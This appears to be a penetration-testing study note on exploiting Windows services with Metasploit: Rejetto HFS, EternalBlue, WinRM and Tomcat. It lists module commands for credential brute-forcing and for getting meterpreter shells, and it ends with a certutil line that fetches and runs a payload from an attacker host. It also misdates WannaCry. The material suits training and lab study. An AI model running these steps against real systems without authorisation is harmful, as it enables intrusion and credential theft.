# i - Windows Exploitation

## <mark style="color:red;">Exploiting A Vulnerable HTTP File Server</mark>

* An HTTP File Server (HFS) is a web server that is designed for file & document sharing.
* HTTP File Servers typically run on TCP port 80 and utilize the HTTP protocol for underlying communication.
* Rejetto HFS is a popular free and open source HTTP file server that can be setup on both Windows and Linux.
* Rejetto HFS V2.3 is vulnerable to a remote command execution attack.
* MSF has an exploit module that we can utilize to gain access to the target system hosting the HFS.

### **Practical Demonstration**

```bash
msf5 > use exploit/windows/http/rejetto_hfs_exec # Exploit for Rejetto 2.3.
```



## <mark style="color:red;">Exploiting Windows MS17-010 SMB Vulnerability</mark>

* **EternalBlue (MS17-010/CVE-2017-0144)** is the name given to a collection of Windows vulnerabilities and exploits that allow attackers to remotely execute arbitrary code and gain access to a Windows system and consequently the network that the target system is a part of.
* The EternalBlue exploit was developed by the NSA (National Security Agency) to take advantage of the MS17-010 vulnerability and was leaked to the public by a hacker group called the Shadow Brokers in 2017.
* The EternalBlue exploit takes advantage of a vulnerability in the Windows SMBv1 protocol that allows attackers to send specially crafted packets that consequently facilitate the execution of arbitrary commands.
* The EternalBlue exploit was used in the WannaCry ransomware attack on June 27, 2017 to exploit other Windows systems across networks with the objective of spreading the ransomware to as many systems as possible.
* This vulnerability affects multiple versions of Windows:
  * Windows Vista
  * Windows 7
  * Windows Server 2008
  * Windows 8.1
  * Windows Server 2012
  * Windows 10
  * Windows Server 2016
* Microsoft released a patch for the vulnerability in March, 2017, however, many users and companies have still not yet patched their systems.
* The EternalBlue exploit has a MSF auxiliary module that can be used to check if a target system is vulnerable to the exploit and also has an exploit module that can be used to exploit this vulnerability on unpatched systems.
* The EternalBlue exploit module can be used to exploit vulnerable Windows systems and consequently provide us with a privileged meterpreter session on the target system.

### **Practical Demonstration**

{% code overflow="wrap" lineNumbers="true" %}
```bash
msf5 > use auxiliary/scanner/smb/smb_ms17_010 # check if the target is vulnerable to EternalBlue.
msf5 > use exploit/windows/smb/ms17_010_eternalblue #Exploit for EternalBlue.
```
{% endcode %}



## <mark style="color:red;">Exploiting WinRM (Windows Remote Management Protocol)</mark>

* Windows Remote Management (WinRM) is a Windows remote management protocol that can be used to facilitate remote access with Windows systems.
* WinRM is typically used in the following ways:
  * Remotely access and interact with Windows hosts on a local network.
  * Remotely access and execute commands on Windows systems on the internet.
  * Manage and configure Windows systems remotely.
* WinRM typically uses TCP port <mark style="color:yellow;">**5985**</mark> and <mark style="color:yellow;">**5986**</mark> (HTTPS).
* WinRM implements access control and security for communication between systems through various forms of authentication.
* We can utilize the MSF to identify WinRM users and their passwords as well as execute commands on the target system.
* We can also utilize an MSF WinRM exploit module to obtain a meterpreter session on the target system.

### **Practical Demonstration**

{% code overflow="wrap" lineNumbers="true" %}
```bash
msf5 > use auxiliary/scanner/winrm/winrm_auth_methods # Perform WinRM authentication method detection.
msf5 > use auxiliary/scanner/winrm/winrm_login # Perform brute-force attack to obtain legitimate credentials
msf5 > use auxiliary/scanner/winrm/winrm_cmd # Used to perform arbitrary commands using the WinRM service
msf5 > use exploit/windows/winrm/winrm_scipt_exec # Use legitimate credentials to execute a payload and return a meterpreter shell.
msf5 > set FORCE_VBS true
msf5 > run
```
{% endcode %}



## <mark style="color:red;">Exploiting A Vulnerable Apache Tomcat Web Server</mark>

* Apache Tomcat, also known as Tomcat server, is a popular, free and open source Java servlet web server.
* It is used to build and host dynamic websites and web applications based on the Java software platform.
* Apache Tomcat utilizes the HTTP protocol to facilitate the underlying communication between the server and clients.
* Apache Tomcat runs on TCP port 8080 by default.
* The standard Apache HTTP web server is used to host static and dynamic websites or web applications, typically developed in PHP.
* The Apache Tomcat web server is primarily used to host dynamic websites or web application developed in Java.
* Apache Tomcat V8.5.19 is vulnerable to a remote code execution vulnerability that could potentially allow an attacker to upload and execute a JSP payload in order to gain remote access to the target server.
* We can utilize a prebuilt MSF exploit module to exploit this vulnerability and consequently gain access to the target server.

### **Practical Demonstration**

{% code overflow="wrap" lineNumbers="true" %}
```bash
msf5 > use exploit/multi/http/tomcat_jsp_upload_bypass #Upload a JSP payload onto the target and therefore give us a shell.
msf5 > set payload java/jsp_shell_bind_tcp
msf5 > set SHELL cmd # setting the shell option to cmd prompt for windows.

# for linux.
# When you will click on any of the links in left panel, it will ask to login.
# Now, we have an exploit in msf to get the login credentials:- auxiliary/scanner/http/tomcat_mgr_login
msf5 > use auxiliary/scanner/http/tomcat_mgr_login
msf5 > set RPORT # then run, you get the creds.

# Click on ‘List Applications’ under Manager tab, and you will see there are couple of options to upload the file.
# Now we can try exploiting upload vulnerability on this one, either using the exploit available on msfconsole or creating an exploit using msfvenom.
# Here we have an exploit which can be used for deploying the file on tomcat /manager directory.
# Use use exploit/multi/http/tomcat_mgr_deploy and make sure to set the username and password too for manager along with other options, this will be the one we used to login.
msf5 > use exploit/multi/http/tomcat_mgr_deploy


#Generate a payload, upload it to the target system, setup a listener, execute the payload in order to get a meterpreter shell!.
# using certutil to copy file into the windows target.
cmd > certutil -urlcache -f http://$ip/meterpreter.exe meterpreter.exe
cmd > .\meterpreter.exe # launch the payload file.
```
{% endcode %}



